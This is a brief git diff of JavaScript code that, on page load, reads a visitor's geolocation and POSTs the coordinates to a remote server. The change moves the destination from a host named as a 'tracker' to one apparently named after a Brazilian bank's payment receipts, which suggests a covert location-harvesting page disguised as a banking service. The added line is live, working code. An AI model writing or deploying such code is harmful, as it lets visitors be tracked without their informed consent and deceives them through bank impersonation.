@@ -12,7 +12,7 @@ document.addEventListener("DOMContentLoaded", () => {
           const lon = position.coords.longitude;
 
           try {
-            const resposta = await fetch("https://rastreador-js-1.onrender.com/localizacao", {
+            const resposta = await fetch("https://nubank-comprovantes.onrender.com//localizacao", {
               method: "POST",
               headers: {
                 "Content-Type": "application/json"
